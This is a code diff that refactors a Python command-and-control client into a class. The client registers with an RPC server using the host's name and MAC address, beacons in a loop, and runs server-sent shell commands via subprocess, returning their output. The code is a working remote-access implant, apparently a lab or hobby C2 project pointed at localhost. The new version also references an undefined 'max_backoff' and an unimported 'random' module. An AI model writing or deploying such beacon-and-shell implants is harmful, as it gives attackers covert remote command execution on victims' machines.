@@ -1,4 +1,4 @@
-import urllib.request
+import requests
 import time
 import uuid
 import json
@@ -6,165 +6,183 @@ import socket
 import subprocess
 
 SERVER = "http://127.0.0.1:8000/rpc"
-BEACON_INTERVAL = 10
 
-def rpc(method, params=None):
-    payload = {
-        "jsonrpc": "2.0",
-        "method": method,
-        "params": params or {},
-        "id": str(uuid.uuid4())
-    }
+class Agent:
+    def __init__(self):
+        self.client_id = None
+        self.session = requests.Session()
 
-    req = urllib.request.Request(
-        SERVER,
-        data=json.dumps(payload).encode(),
-        headers={"Content-Type": "application/json"},
-        method="POST"
-    )
+        self.handlers = {
+            "shell": self.handle_shell,
+            "print_message": self.handle_print
+        }
 
-    try:
-        with urllib.request.urlopen(req, timeout=5) as res:
-            if res.status == 204:
+    def rpc(self, method, **params):
+        payload = {
+            "jsonrpc": "2.0",
+            "method": method,
+            "params": params,
+            "id": str(uuid.uuid4())
+        }
+
+        try:
+            res = self.session.post(
+                SERVER,
+                json = payload,
+                timeout = 70
+            )
+
+            if res.status_code == 204:
                 return None
             
-            data = json.loads(res.read().decode())
+            data = res.json()
 
             if "error" in data:
                 err = data["error"]
                 raise Exception(err["message"] if isinstance(err, dict) else err)
-            
+                
             return data.get("result")
+            
+        except Exception as e:
+            print("[RPC ERROR]", e)
+            return None
+
+    @staticmethod
+    def get_hostname():
+        return socket.gethostname()
+
+    @staticmethod
+    def get_mac():
+        mac = uuid.getnode()
+        return ':'.join(
+            f"{(mac >> shift) & 0xff:02x}"
+            for shift in range(40, -1, -8)
+        )
+    
+    def handle_shell(self, params):
+        cmd = params.get("cmd")
+
+        if not cmd:
+            return self.result(stderr = "no command provided", exit_code = -1)
         
-    except Exception as e:
-        print("[RPC ERROR]", e)
-        return None
-
-def get_hostname():
-    return socket.gethostname()
-
-def get_mac():
-    mac = uuid.getnode()
-    return ':'.join(f'{(mac >> ele) & 0xff:02x}'
-                    for ele in range(40, -1, -8))
-
-def identify():
-    return rpc("identify", {
-        "hostname": get_hostname(),
-        "mac": get_mac(),
-    })
-
-def beacon(client_id):
-    return rpc("beacon", {
-        "client_id": client_id
-    })
-
-def shell_handler(params):
-    cmd = params.get("cmd")
-    if not cmd:
-        return {
-            "stdout": "",
-            "stderr": "no command provided",
-            "exit_code": -1           
-        }
-
-    result = subprocess.run(
+        result = subprocess.run(
             cmd,
-            shell=True,
-            capture_output=True,
-            text=True
+            shell = True,
+            capture_output = True,
+            text = True
         )
 
-    return {
-        "stdout": result.stdout,
-        "stderr": result.stderr,
-        "exit_code": result.returncode
-    }
+        return self.result(
+            stdout = result.stdout,
+            stderr = result.stderr,
+            exit_code = result.returncode
+        )
 
-def execute_task(client_id, task):
-    if not task:
-        return
+    def handle_print(self, params):
+        return self.result(stdout = params.get("message", ""))
     
-    task_id = task.get("id")
-    method = task.get("method")
-    params = task.get("params", {})
-
-    handlers = {
-        "shell": shell_handler,
-        "print_message": lambda p: {
-            "stdout": p.get("message", ""),
-            "stderr": "",
-            "exit_code": 0
+    @staticmethod
+    def result(stdout="", stderr="", exit_code=0):
+        return {
+            "stdout": stdout,
+            "stderr": stderr,
+            "exit_code": exit_code
         }
-    }
 
-    handler = handlers.get(method)
+    def identify(self):
+        result = self.rpc(
+            "identify", 
+            hostname = self.get_hostname(),
+            mac = self.get_mac()
+        )
 
-    if not handler:
-        send_result(client_id, task_id, {
-            "status": "error",
-            "output": {
-                "stderr": "method not found",
-                "stdout": "",
-                "exit_code": -1
+        if result:
+            self.client_id = result.get("client_id")
+
+        return self.client_id
+
+    def beacon(self):
+        return self.rpc(
+            "beacon", 
+            client_id = self.client_id
+        )
+    
+    def send_result(self, task_id, status, output):
+        self.rpc(
+            "task_result", 
+            client_id = self.client_id,
+            task_id = task_id,
+            result = {
+                "status": status,
+                "output": output
             }
-        })
-        return
-    
-    try:
-        result = handler(params)
+        )
 
-        send_result(client_id, task_id, {
-            "status": "ok",
-            "output": result
-        })
-    
-    except Exception as e:
-        send_result(client_id, task_id, {
-            "status": "error",
-            "output": {
-                "stderr": str(e),
-                "stdout": "",
-                "exit_code": -1
-            }
-        })
+    def execute_task(self, task):
+        if not task:
+            return
+        
+        task_id = task.get("id")
+        method = task.get("method")
+        params = task.get("params", {})
 
-def send_result(client_id, task_id, result):
-    rpc("task_result", {
-        "client_id": client_id,
-        "task_id": task_id,
-        "result": result
-    })
+        handler = self.handlers.get(method)
 
-def main():
-    print("[*] loading profile...")
-
-    result = identify()
-
-    if not result:
-        print("[-] failed to load profile")
-        return
-    
-    client_id = result.get("client_id")
-
-    if not client_id:
-        print("[DEBUG] no client_id received")
-        return
-
-    print(f"[+] identified as {client_id}")
-    
-    while True:
+        if not handler:
+            self.send_result(
+                task_id, 
+                "error",
+                self.result(
+                    stderr="method not found",
+                    exit_code=1
+                )
+            )
+            return
+        
         try:
-            time.sleep(BEACON_INTERVAL)
+            result = handler(params)
 
-            result = beacon(client_id)
-            if not result:
-                continue
-
-            execute_task(client_id, result.get("task"))
-
+            self.send_result(task_id, "ok", result)
+        
         except Exception as e:
-            print("[LOOP ERROR]", e)
+            self.send_result(
+                task_id,
+                "error",
+                self.result(
+                    stderr = str(e),
+                    exit_code = -1
+                )
+            )
+
+    def run(self):
+        print("[*] loading profile...")
+
+        if not self.identify():
+            print("[-] failed to identify")
+            return
+        
+        print(f"[+] identified as {self.client_id}")
+
+        backoff = 1
+
+        while True:
+            try:
+                result = self.beacon()
+
+                if result:
+                    self.execute_task(result.get("task"))
+                
+                backoff = 1
+                time.sleep(5)
+
+            except requests.RequestException:
+                delay = random.uniform(
+                    backoff * 0.5,
+                    backoff
+                )
+
+                time.sleep(delay)
+                backoff = min(backoff * 2, max_backoff)
 
 if __name__ == "__main__":
-    main()
+    Agent().run()
